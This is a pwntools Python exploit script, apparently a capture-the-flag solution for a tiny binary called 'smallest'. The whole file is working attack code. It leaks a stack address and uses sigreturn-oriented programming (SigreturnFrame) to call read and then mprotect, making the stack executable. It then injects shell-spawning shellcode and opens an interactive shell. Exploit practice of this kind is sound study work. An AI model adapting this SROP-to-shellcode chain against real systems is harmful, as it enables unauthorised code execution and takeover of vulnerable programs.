from pwn import *
context.log_level='debug'
main=0x0000000004000B0
syscall=0x00000000004000be
p=process('./smallest')


context.arch='amd64'
shellcode=asm(shellcraft.sh())

p.send(p64(main)*3)
sleep(0.3)
#1

raw_input()
p.send("\xb3")

p.read(8)

stack=u64(p.read(8))
log.warning(hex(stack))

sig=SigreturnFrame()
sig.rax=0
sig.rdi=0
sig.rsi=stack&0xfffffffffffffff0
sig.rdx=0x200
sig.rip=0x4000be
sig.rsp=stack&0xfffffffffffffff0
ret=0x00000000004000c0
#2
gdb.attach(p)
raw_input()

p.send(p64(main)+p64(0)+str(sig))
sleep(0.3)
#3

payload=p64(0x0000000004000Be)+p64(0)[:-1]
raw_input()
p.send(payload)
sleep(0.3)

sig=SigreturnFrame()
sig.rax=10
sig.rdi=stack&0xffffffffffff0000
sig.rsi=0x10000
sig.rdx=7
sig.rip=0x4000be
sig.rsp=0x110+(stack&0xfffffffffffffff0)
ret=0x00000000004000c0
payload=p64(main)+p64(0)
raw_input()
p.send(payload+str(sig)+p64(0xdeadbeef)+p64((stack&0xffffffffffff0)+0x118)+asm(shellcraft.sh()))

sleep(0.3)
payload=p64(0x4000Be)+p64(0)[:-1]
raw_input()
p.send(payload)


p.interactive()
